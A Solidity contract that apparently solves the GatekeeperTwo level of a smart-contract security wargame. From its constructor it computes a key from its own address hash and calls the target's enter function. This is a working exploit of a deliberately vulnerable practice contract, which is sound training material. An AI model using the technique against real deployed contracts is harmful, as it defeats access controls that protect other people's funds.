// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "src/GatekeeperTwo/GatekeeperTwo.sol";

contract GateunlockerTwo {
    constructor(address target) {
        GatekeeperTwo gate = GatekeeperTwo(target);

        uint64 msg64 = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 key64 = uint64(msg64 ^ type(uint64).max);
        bytes8 key = bytes8(key64);

        gate.enter(key);
    }
}
